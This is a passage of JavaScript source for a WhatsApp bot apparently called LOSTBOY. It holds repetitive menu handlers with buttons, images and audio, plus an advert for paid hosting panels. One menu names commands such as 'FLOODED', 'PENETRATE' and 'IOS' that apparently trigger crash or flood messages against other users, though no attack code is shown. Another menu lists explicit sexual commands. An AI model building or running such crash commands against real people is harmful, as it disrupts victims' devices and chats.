> 𝙻𝙾𝚂𝚃𝙱𝙾𝚈𝙷𝙸𝚃
> 𝙻𝙾𝚁𝙳
> 𝙲𝚂𝚄𝙸𝚃𝚂𝙷𝙾𝚃
> 𝙿𝟷
> 𝚃𝙰𝙲𝙺𝙻𝙴
> 𝙻𝙰𝚅𝙰
> 𝙿𝙴𝙽𝙴𝚃𝚁𝙰𝚃𝙴

 IOՏ 
 
> 𝙵𝙻𝙾𝙾𝙳𝙴𝙳

 ᘜᑕ 
 
> 𝙳𝙶𝙲`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/8x33pv.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      
        {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'funmenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `😈`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᖴᑌᑎ ᗰᗴᑎᑌ 
 
> 𝙲𝙴𝙲𝙰𝙽-𝙸𝙽𝙳𝙾
> 𝙴𝙽𝙲𝙾𝙳𝙴
> 𝚂𝚂
> 𝙴𝙽𝙲𝚁𝚈𝙿𝚃
> 𝚁𝙿𝚂
> 𝚅𝚅
> 𝚅𝚅𝟸
`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
{
        buttonId: 'cecan-indo',
        buttonText: {
         displayText: '𝙲𝙴𝙲𝙰𝙽 𝙸𝙽𝙳𝙾' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'databasemenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `😲`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᗪᗩTᗩᗷᗩՏᗴ ᗰᗴᑎᑌ 
 
> 𝙰𝙳𝙳𝚅𝙸𝙳𝙴𝙾
> 𝙰𝙳𝙳𝙸𝙼𝙰𝙶𝙴
> 𝙰𝙳𝙳𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙰𝙳𝙳𝚅𝙽
> 𝙰𝙳𝙳𝚉𝙸𝙿
> 𝙰𝙳𝙳𝙰𝙿𝙺
> 𝙰𝙳𝙳𝙿𝙳𝙵
> 𝙳𝙴𝙻𝚅𝙸𝙳𝙴𝙾
> 𝙳𝙴𝙻𝙸𝙼𝙰𝙶𝙴
> 𝙳𝙴𝙻𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙳𝙴𝙻𝚅𝙽
> 𝙳𝙴𝙻𝚉𝙸𝙿
> 𝙳𝙴𝙻𝙰𝙿𝙺
> 𝙳𝙴𝙻𝙿𝙳𝙵
> 𝙻𝙸𝚂𝚃𝚅𝙸𝙳𝙴𝙾
> 𝙻𝙸𝚂𝚃𝙸𝙼𝙰𝙶𝙴
> 𝙻𝙸𝚂𝚃𝚂𝚃𝙸𝙲𝙺𝙴𝚁
> 𝙻𝙸𝚂𝚃𝚅𝙽
> 𝙻𝙸𝚂𝚃𝚉𝙸𝙿
> 𝙻𝙸𝚂𝚃𝙰𝙿𝙺
> 𝙻𝙸𝚂𝚃𝙿𝙳𝙵`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'downloadmenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
ᗪOᗯᑎᒪOᗩᗪ ᗰᗴᑎᑌ

> 𝙶𝙸𝚃
> 𝙶𝙸𝚃𝙲𝙻𝙾𝙽𝙴
> 𝙿𝙻𝙰𝚈
> 𝚈𝚃𝙼𝙿𝟹
> 𝚈𝚃𝙼𝙿𝟺
> 𝚂𝙾𝚄𝙽𝙳 𝟷 - 𝚂𝙾𝚄𝙽𝙳𝟷𝟼𝟷
`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'convertmenu':{await LostBoyTechInc.sendMessage(m.chat, { react: { text: `🤤`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᑕOᑎᐯᗴᖇT ᗰᗴᑎᑌ
 
> 𝚂𝚃𝙸𝙺𝙴𝚁
> 𝚂𝙼𝙴𝙼𝙴
> 𝚃𝙾𝙸𝙼𝙰𝙶𝙴
> 𝚃𝙾𝚅𝙸𝙳𝙴𝙾
> 𝚃𝙾𝙰𝚄𝙳𝙸𝙾
> 𝚃𝙾𝙼𝙿𝟹
> 𝚃𝙾𝚅𝙽
> 𝚃𝙾𝙶𝙸𝙵
> 𝚃𝙾𝚄𝚁𝙻
> 𝚃𝙾𝚀𝚁
> 𝚃𝙾𝚅𝙸𝙴𝚆𝙾𝙽𝙲𝙴
> 𝙵𝙻𝙸𝙿𝚃𝙴𝚇𝚃
> 𝙴𝙼𝙾𝙹𝙸𝙼𝙸𝚇`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'cpanelmenu':{
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `😇`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
 ᑕᑭᗩᑎᗴᒪ ᗰᗴᑎᑌ
 
> 𝙻𝙸𝚂𝚃𝚁𝙰𝙼
> 𝙻𝙸𝚂𝚃𝚂𝚁𝚅
> 𝙰𝙳𝙳𝙿𝚁𝙴𝙼
> 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄
> 𝙿𝙰𝚈
> 𝙾𝚆𝙽𝙴𝚁`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'listram',
        buttonText: {
         displayText: '𝙻𝙸𝚂𝚃𝚁𝙰𝙼' },
        
      },
            {
        buttonId: 'listsrv',
        buttonText: { 
        displayText: '𝙻𝙸𝚂𝚃𝚂𝚁𝚅' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break
case 'creampiemenu':{
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `😁`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
  ᑕᖇᗴᗩᗰᑭIᗴ ᗰᗴᑎᑌ

> 𝙷𝙽𝙴𝙺𝙾
> 𝚃𝚁𝙰𝙿
> 𝙶𝙸𝙵𝙱𝙻𝙾𝚆𝙹𝙾𝙱
> 𝙰𝙽𝙸𝙼𝙴𝚂𝙿𝙰𝙽𝙺
> 𝙽𝚆𝙰𝙸𝙵𝚄`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄.'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break;
case 'animemenu':{
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `😁`, key: m.key }})
const caption = `*𝙾𝚆𝙽𝙴𝚁: ${global.ownername}*
*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕${global.prefa}⌕*
*𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: ${isPremium ? "Premium" : "Free"}*
*𝙷𝙾𝚂𝚃: ${os.hostname()}*
*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
■□■□■□■□□■□■□□■□■□
> 𝙷𝙴𝙻𝙻𝙾 ${pushname}
□■□■□■□■□□■□■□■□■□
${readmore}
  ᗩᑎIᗰᗴ ᗰᗴᑎᑌ

> 𝚂𝚃𝙸𝙲𝙺𝙰𝚆𝙾𝙾
> 𝚂𝚃𝙸𝙲𝙺𝚆𝙰𝚅𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝙱𝙻𝚄𝚂𝙷
> 𝚂𝚃𝙸𝙲𝙺𝙲𝚁𝙸𝙽𝙶𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙷𝙰𝙿𝙿𝚈
> 𝚂𝚃𝙸𝙲𝙺𝙶𝙻𝙾𝙼𝙿
> 𝚂𝚃𝙸𝙲𝙺𝙳𝙰𝙽𝙲𝙴
> 𝚂𝚃𝙸𝙲𝙺𝙼𝚄𝙶
> 𝚂𝚃𝙸𝙲𝙺𝙷𝙸𝙶𝙷𝙵𝙸𝚅𝙴
> 𝚂𝚃𝙸𝙲𝙺𝚂𝙷𝙸𝙽𝙾𝙱𝚄
> 𝚂𝚃𝙸𝙲𝙺𝙲𝚄𝙳𝙳𝙻𝙴`;

  LostBoyTechInc.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/s7huhm.jpg" },
    caption,
    mentions: [m.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: 'ownermenu',
        buttonText: {
         displayText: '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: { 
        displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'downloadmenu',
        buttonText: { 
        displayText: '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄.'},
        
      },
            {
        buttonId: 'databasemenu',
        buttonText: { 
        displayText: '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'cpanelmenu',
        buttonText: {
         displayText: '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'animemenu',
        buttonText: {
         displayText: '𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄'},
        
      },
            {
        buttonId: 'mainmenu',
        buttonText: { 
        displayText: '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄' },
        
      },
            {
        buttonId: 'creampiemenu',
        buttonText: {
         displayText: '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄' },
        
      },
      {
        buttonId: 'bugmenu',
        buttonText: { 
        displayText: '𝙱𝚄𝙶𝙼𝙴𝙽𝚄' },

      },
      {
        buttonId: 'Funmenu',
        buttonText: {
         displayText: '𝙵𝚄𝙽𝙼𝙴𝙽𝚄' },

      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `1203233549551004@newsletter`, // Use the newsletterJid here
        newsletterName: `LOSTBOY ` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await LostBoyTechInc.sendMessage(m.chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: m })
}
break;
                case 'listram':
                xmenu_oh = `
                ■□■□■□■□□■□■□□■□■□
> Hello ${pushname}
□■□■□■□■□□■□■□■□■□
> ╰⭑➤⭑➤ ${lostboytimewisher} 😇
${readmore}
 
Wagwan guys, I'm Lostboy,a legit panel vendor and a bot seller
https://wa.me/233549551004
╭───❏ ᴍʏ sᴇʀᴠɪᴄᴇs│
    *LIST PRIVATE PANEL*
*BY LOSTBOY😮‍💨🖐️ WE DONT DO SCAM HERE*
 !.  ● * 1ɢʙ ➤ 500*
╎. ● *2ɢʙ ➤ 1000*
╎. ● *3ɢʙ ➤ 1500*
╎. ● *4ɢʙ ➤ 2000*
╎. ● *5ɢʙ ➤ 2500*
╎. ● *6gb ➤ 3000*
╎. ● *7gb ➤ 3500*
╎. ● *8gb ➤ 4000*
╎. ● *9gb ➤ 4500*
╎. ● *10gb ➤ 5k*
╎. ● *unli ➤ 7k*
>>┈┈┈┈┈┈┈┈┈┈┈

 *DM if interested in panel or deployment             
╰━━━━━━━━━━━━━━━━──⊷
 *LOSTBOY*
▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ `
if (typemenu === 'v1') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
